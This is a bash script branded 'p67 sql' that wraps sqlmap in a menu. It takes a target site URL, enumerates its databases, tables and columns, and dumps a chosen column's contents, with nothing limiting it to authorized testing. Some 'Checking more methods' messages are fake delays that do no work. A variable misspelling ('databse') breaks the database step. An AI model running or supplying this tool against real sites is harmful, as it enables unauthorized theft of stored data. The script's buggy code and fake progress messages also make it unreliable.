#!/bin/bash

green="\e[32m"
yellow="\e[33m"
blue="\e[34m"
red="\e[31m"
blink="\e[5m"
Normal="\e[0m"

url()
{    
    echo -e $green
    figlet p67 sql
    
    echo -e "$blue \nEnter site adress : $Normal "
    read url
    echo -e "$yellow wait a few second $blink ... $Normal " 
    sleep 3
    sqlmap -u $url --dbs
    sleep 2
}
dbs()
{
    echo -e "$yellow \nEnter the DATABASE name : $Normal \n"
    read databse
    sqlmap -u $url -D $database --table
    sleep 2
}
table()
{
   echo -e "$yellow \nEnter the TABLE name : $Normal \n"
   read table
   sqlmap -u $url -D $database -T $table --columns
   sleep 2 
}
column()
{
    echo -e "$yellow \nEnter the COLONM name : $Normal \n"
    read column
    sqlmap -u $url -D $database -T $table -C $column --dump
    sleep 2
}
url
    echo -e "$yellow \nchoose one option $Normal "
    echo -e "$yellow \n[1]Database found\n[2]Database not found $Normal "
    read num
    if [ $num -eq 1 ]
    then
       dbs
       echo -e "$yellow \nchoose one option $Normal "
       echo -e "$yellow \n[1]Table found\n[2]Table not found\n[3]Goback $Normal "
       read tm
       if [ $tm -eq 1 ]
       then
        table
        echo -e "$yellow \nchoose one option $Normal "
        echo -e "$yellow \n[1]Coloumn found\n[2]Column not found\n[3]goback $Normal "
        read cm
        if [ $cm -eq 1 ]
        then
            column
        elif [ $cm -eq 2 ]
        then
            echo -e "$yellow \n Checking more methods $blink ...... $Normal "
            sleep 5
            echo -e "$red \n $blink opps..! cant get the column$Normal "
            url
        elif [ $cm -eq 3 ]
        then
            table  
        else
            clear
            echo -e $green
            figlet p67 sql
            echo -e "$red \n $blink opps..! choose correct one$Normal"
            sleep 2
            clear
            url 
        fi
       elif [ $tm -eq 2 ]
       then
        echo -e "$yellow \n Checking more methods $blink ...... $Normal "
        sleep 5
        echo -e "$red \n $blink opps..! cant get the table$Normal "
        sleep 2
        clear
        url
       elif [ $tm -eq 3 ]
       then
        dbs
        
        echo -e "$yellow \nchoose one option $Normal "
       echo -e "$yellow \n[1]Table found\n[2]Table not found\n[3]Goback $Normal "
       read tm
       if [ $tm -eq 1 ]
       then
        table
        echo -e "$yellow \nchoose one option $Normal "
        echo -e "$yellow \n[1]Coloumn found\n[2]Column not found\n[3]goback $Normal "
        read cm
        if [ $cm -eq 1 ]
        then
            column
        elif [ $cm -eq 2 ]
        then
            echo -e "$yellow \n Checking more methods $blink ...... $Normal "
            sleep 5
            echo -e "$red \n $blink opps..! cant get the column$Normal "
            url
        elif [ $cm -eq 3 ]
        then
            table
        else
            clear
            echo -e $green
            figlet p67 sql
            echo -e "$red \n $blink opps..! choose correct one$Normal"
            sleep 2
            clear
            url 
        fi
       elif [ $tm -eq 2 ]
       then
        echo -e "$yellow \n Checking more methods $blink ...... $Normal "
        sleep 5
        echo -e "$red \n $blink opps..! cant get the table$Normal "
        sleep 2
        clear
        url
       elif [ $tm -eq 3 ]
       then
        dbs
       else
        clear
        echo -e $green
        figlet p67 sql
        echo -e "$red \n $blink opps..! choose correct one$Normal"
        sleep 2
        clear
        url
       fi        
        
       else
        clear
        echo -e $green
        figlet p67 sql
        echo -e "$red \n $blink opps..! choose correct one$Normal"
        sleep 2
        clear
        url
       fi
    elif [ $num -eq 2 ]
    then
        clear
        echo -e $green
        figlet p67 sql
        echo -e "$yellow \n Checking more methods $blink ...... $Normal "
        sleep 5
        clear
        echo -e $green
        figlet p67 sql
        echo -e "$red \n $blink The database is more secure$Normal "
    else
        clear
        echo -e $green
        figlet p67 sql
        echo -e "$red \n $blink opps..! choose correct one$Normal"
        sleep 2
        clear
        url
    fi
        
